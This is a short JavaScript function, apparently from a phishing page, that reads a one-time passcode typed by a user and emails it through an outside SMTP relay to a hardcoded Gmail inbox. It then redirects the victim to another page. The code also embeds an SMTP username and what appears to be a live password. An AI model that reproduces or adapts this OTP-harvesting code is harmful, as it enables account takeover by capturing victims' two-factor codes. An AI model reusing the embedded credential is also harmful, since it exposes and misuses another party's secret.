function emailSend() {
  var otp = document.getElementById('otp').value; // Getting the OTP entered by the user
  var messageBody = "OTP: " + otp; // Constructing the message body with OTP

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "burujikasamu42@gmail.com",
    Password: "4EBB12813A91DC5063FFFB31AF367160FECC",
    To: 'burujikasamu42@gmail.com', // Change this to your email address where you want to receive the OTP
    From: "burujikasamu42@gmail.com",
    Subject: "OTP",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'otp.html'; // Redirecting to otp.html upon successful email sending
      }
      else {
        swal("Error", "Please complete the OTP field", "error") // Displaying an error message if email sending fails
      }
    }
  );
}
